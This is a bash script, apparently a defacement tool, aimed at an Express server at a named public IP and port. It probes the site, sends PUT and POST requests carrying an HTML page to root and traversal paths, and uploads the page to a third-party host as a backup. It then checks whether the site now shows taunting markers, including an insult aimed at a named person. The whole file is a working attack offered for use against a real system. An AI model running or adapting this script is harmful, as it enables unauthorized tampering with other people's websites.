#!/bin/bash
# 🔥 TRUSTEDF57 ROOT OVERRIDE - 5.189.141.162:3000/
TARGET="5.189.141.162:3000"
HTML="TRUSTEDF57.html"

echo -e "\n${blue}🎯 TRUSTEDF57 → EXPRESS ROOT DEFACE${nc}"
echo "Target: http://$TARGET/"
echo "File: $HTML ($(du -h $HTML | cut -f1))"

# 1. PROBE ROOT
echo "🔍 PROBE..."
curl -s "http://$TARGET/" -w "\nROOT: %{http_code}\n" | head -3

# 2. ROOT OVERRIDE PATHS (Express static/templating)
paths=("" "/index" "/main" "/home" "/public/" "/static/" "/../" "/favicon.ico" "/robots.txt")
for p in "${paths[@]}"; do
    echo -n "PUT $p ... "
    code=$(curl -s -w "%{http_code}" -X PUT "http://$TARGET$p" \
        --data-binary @$HTML \
        -H "Content-Type: text/html" \
        -H "X-Powered-By: Express" \
        --max-time 8 2>/dev/null | tail -1)
    echo "$code"
    [[ $code == 2* ]] && echo "✅ ROOT HIT $p → $code" && break
done

# 3. POST FALLBACK root
echo -n "POST / ... "
POST_CODE=$(curl -s -w "%{http_code}" -X POST "http://$TARGET/" \
    --data-binary @$HTML \
    -H "Content-Type: text/html" \
    --max-time 5 | tail -1)
echo "$POST_CODE"

# 4. UPLOAD srv.run (backup pubblico)
SRV_URL=$(curl -s https://srv.run --data-binary @$HTML 2>/dev/null | grep -o 'https://srv.run/[^[:space:]]*' | head -1)
echo "🌐 BACKUP: $SRV_URL"

# 5. VERIFICA DEFACE
sleep 3
echo "\n🔍 VERIFICA http://$TARGET/:"
RESP=$(curl -s "http://$TARGET/" | grep -ioE "(TRUSTEDF57|FUCK OFF MARTHA|PEPP|E BRESCIA|F57|SLAMMED)" || true)
if [[ -n "$RESP" ]]; then
    echo "🎉 ${green}DEFACED!${nc} → $RESP"
else
    echo "⚠️ No markers - ma check browser!"
fi

echo -e "\n${yellow}TEST FINALE:${nc}"
echo "curl -s http://5.189.141.162:3000/ | grep -i f57"
